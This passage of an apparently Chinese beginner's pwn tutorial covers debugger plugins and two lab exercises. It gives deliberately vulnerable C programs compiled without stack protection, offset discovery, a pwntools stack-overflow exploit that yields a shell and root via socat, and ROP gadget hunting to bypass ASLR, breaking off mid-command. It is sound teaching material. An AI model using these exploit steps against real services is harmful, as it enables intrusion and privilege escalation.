peda的增强版，因为它⽀持更多的架构(ARM, MIPS, POWERPC…)，和更加强⼤的
模块,并且和ida联动。
3)libheap(查看堆信息) pip3 install libheap --verbose
EDB附加
EDB 是⼀个可视化的跨平台调试器，跟win上的Ollydbg很像。
lldb插件
https://mp.weixin.qq.com/s/XGcEHpRuKEL2Dxn1kE7wpw 8/36
2020/7/27 linux pwn⼊门学习到放弃
voltron & lisa。⼀个拥有舒服的ui界⾯，⼀个简洁但⼜拥有实⽤功能的插件。
voltron
配合tmux会产⽣很好的效果，如下:
https://mp.weixin.qq.com/s/XGcEHpRuKEL2Dxn1kE7wpw 9/36
2020/7/27 linux pwn⼊门学习到放弃
实践
通过⼏个例⼦来了解常⻅的⼏种保护⼿段和熟悉常⻅的攻击⼿法。
实践平台 ubuntu 14.16_x64
实践1栈溢出利⽤溢出改变程序⾛向
编译测试⽤例
1 #include 
2 #include 
3 #include 
4 void callsystem()
5 { system("/bin/sh"); }
6 void vulnerable_function() {
7 char buf[128];
8 read(STDIN_FILENO, buf, 512);
9 }
10 int main(int argc, char** argv) {
11 write(STDOUT_FILENO, "Hello, World\n", 13);
12 // /dev/stdin fd/0
13 // /dev/stdout fd/1
14 // /dev/stderr fd/2
15 vulnerable_function();
16 }
编译⽅法：
1 #!bash
2 gcc -fno-stack-protector linux_x64_test1.c -o linux_x64_test1 -ldl //禁⽤栈
检测如下:
1 gdb-peda$ checksec linux_x64_test1
2 CANARY : disabled
https://mp.weixin.qq.com/s/XGcEHpRuKEL2Dxn1kE7wpw 10/36
2020/7/27 linux pwn⼊门学习到放弃
3 FORTIFY : disabled
4 NX : ENABLED
5 PIE : disabled
6 RELRO : Partial
发现没有栈保护，没有CANARY保护。
⽣成构造的数据
这⾥⽤到⼀个脚本pattern.py来⽣成随机数据，来⾃这⾥。
1 python2 pattern.py create 150
2 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3A
获取到溢出偏移
⽤lldb进⾏调试，
1 panda@ubuntu:~/Desktop/test$ lldb linux_x64_test1
2 (lldb) target create "linux_x64_test1"
3 Current executable set to 'linux_x64_test1' (x86_64).
4 (lldb) run
5 Process 117360 launched: '/home/panda/Desktop/test/linux_x64_test1' (x86
6 Hello, World
7 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3
8 Process 117360 stopped
9 * thread #1: tid = 117360, 0x00000000004005e7 linux_x64_test1`vulnerable
10 frame #0: 0x00000000004005e7 linux_x64_test1`vulnerable_function + 3
11 linux_x64_test1`vulnerable_function:
12 -> 0x4005e7 : retq
13
14 linux_x64_test1`main:
15 0x4005e8 : pushq %rbp
16 0x4005e9 : movq %rsp, %rbp
17 0x4005ec : subq $0x10, %rsp
18 (lldb) x/xg $rsp
19 0x7fffffffdd58: 0x3765413665413565
20
21 python2 pattern.py offset 0x3765413665413565
https://mp.weixin.qq.com/s/XGcEHpRuKEL2Dxn1kE7wpw 11/36
2020/7/27 linux pwn⼊门学习到放弃
22 hex pattern decoded as: e5Ae6Ae7
23 136
获取 callsystem 函数地址
因为代码中存在辅助函数callsystem，直接获取地址。
1 panda@ubuntu:~/Desktop/test$ nm linux_x64_test1|grep call
2 00000000004005b6 T callsystem
编写并测试利⽤_提权
pwntools是⼀个⼆进制利⽤框架，可以⽤python编写⼀些利⽤脚本，⽅便达到利⽤漏
洞的⽬的，当然也可以⽤其他⼿段。
1 import pwn
2
3 # p = pwn.process("./linux_x64_test1")
4 p = remote('172.16.36.174', 10002)
5 callsystem_address = 0x00000000004005b6
6 payload="A"*136 + pwn.p64(callsystem_address)
7
8 p.send(payload)
9 p.interactive()
测试利⽤拿到shell，
1 panda@ubuntu:~/Desktop/test$ python test.py
2 [+] Starting local process './linux_x64_test1': pid 117455
3 [*] Switching to interactive mode
4 Hello, World
5 $ whoami
6 panda
将⼆进制程序设置为服务端程序,后续⽂章不再说明。
1 socat TCP4-LISTEN:10001,fork EXEC:./linux_x64_test1
https://mp.weixin.qq.com/s/XGcEHpRuKEL2Dxn1kE7wpw 12/36
2020/7/27 linux pwn⼊门学习到放弃
测试远程程序，
1 panda@ubuntu:~/Desktop/test$ python test2.py
2 [+] Opening connection to 127.0.0.1 on port 10001: Done
3 [*] Switching to interactive mode
4 Hello, World
5 $ whoami
6 panda
如果这个进程是root，
1 sudo socat TCP4-LISTEN:10001,fork EXEC:./linux_x64_test1
测试远程程序，提权成功。
1 panda@ubuntu:~/Desktop/test$ python test.py
2 [+] Opening connection to 127.0.0.1 on port 10001: Done
3 [*] Switching to interactive mode
4 Hello, World
5 $ whoami
6 root
实践2栈溢出通过ROP绕过DEP和ASLR防护
编译测试⽤例
开启ASLR后,libc地址会不断变化,这⾥先不讨论怎么获取真实system地址，⽤了⼀个
辅助函数打印system地址。
1 #include 
2 #include 
3 #include 
4 #include 
5 void systemaddr()
6 {
7 void* handle = dlopen("libc.so.6", RTLD_LAZY);
8 printf("%p\n",dlsym(handle,"system"));
9 fflush(stdout);
10 }
https://mp.weixin.qq.com/s/XGcEHpRuKEL2Dxn1kE7wpw 13/36
2020/7/27 linux pwn⼊门学习到放弃
11 void vulnerable_function() {
12 char buf[128];
13 read(STDIN_FILENO, buf, 512);
14 }
15 int main(int argc, char** argv) {
16 systemaddr();
17 write(1, "Hello, World\n", 13);
18 vulnerable_function();
19 }
编译⽅法：
1 #!bash
2 gcc -fno-stack-protector linux_x64_test2.c -o linux_x64_test2 -ldl //禁⽤栈
检测如下:
1 gdb-peda$ checksec linux_x64_test2
2 CANARY : disabled
3 FORTIFY : disabled
4 NX : ENABLED
5 PIE : disabled
6 RELRO : Partial
观察ASLR，运⾏两次,发现每次libc的system函数地址会变化，
1 panda@ubuntu:~/Desktop/test$ ./linux_x64_test2
2 0x7f9d7d71a390
3 Hello, World
4
5 panda@ubuntu:~/Desktop/test$ ./linux_x64_test2
6 0x7fa84dc3d390
7 Hello, World
ROP简介
https://mp.weixin.qq.com/s/XGcEHpRuKEL2Dxn1kE7wpw 14/36
2020/7/27 linux pwn⼊门学习到放弃
ROP的全称为Return-oriented programming（返回导向编程）,是⼀种⾼级的内存
攻击技术可以⽤来绕过现代操作系统的各种通⽤防御（⽐如内存不可执⾏DEP和代码签
名等）。
寻找ROP
我们希望最后执⾏system("/bin/sh")，缓冲区溢出后传⼊"/bin/sh"的地址和函数
system地址。
我们想要的x64的gadget⼀般如下:
1 pop rdi // rdi="/bin/sh"
2 ret // call system_addr
3
4 pop rdi // rdi="/bin/sh"
5 pop rax // rax= system_addr
6 call rax // call system_addr
系统开启了aslr，只能通过相对偏移来计算gadget，在⼆进制中搜索，这⾥⽤到⼯具
ROPgadget。
1 panda@ubuntu:~/Desktop/test$ ROPgadget --binary linux_x64_test2 --only "p
2 Gadgets information
3 ============================================================
4
5 Unique gadgets found: 0
获取⼆进制的链接，
1 panda@ubuntu:~/Desktop/test$ ldd linux_x64_test2
2 linux-vdso.so.1 => (0x00007ffeae9ec000)
3 libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fdc0531f000)
4 libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fdc04f55000)
5 /lib64/ld-linux-x86-64.so.2 (0x00007fdc05523000)
在库中搜索 pop ret，
1 panda@ubuntu:~/Desktop/test$ ROPgadget --binary /lib/x86_64-linux-gnu/lib
2 0x0000000000020256 : pop rdi ; pop rbp ; ret
https://mp.weixin.qq.com/s/XGcEHpRuKEL2Dxn1kE7wpw 15/36
2020/7/27 linux pwn⼊门学习到放弃
3 0x0000000000021102 : pop rdi ; ret
决定⽤ 0x0000000000021102，在库中搜索 /bin/sh 字符串。
1 panda@ubuntu:~/Desktop/test$ ROPgadget --binary /lib/x86_64-linux-gnu/lib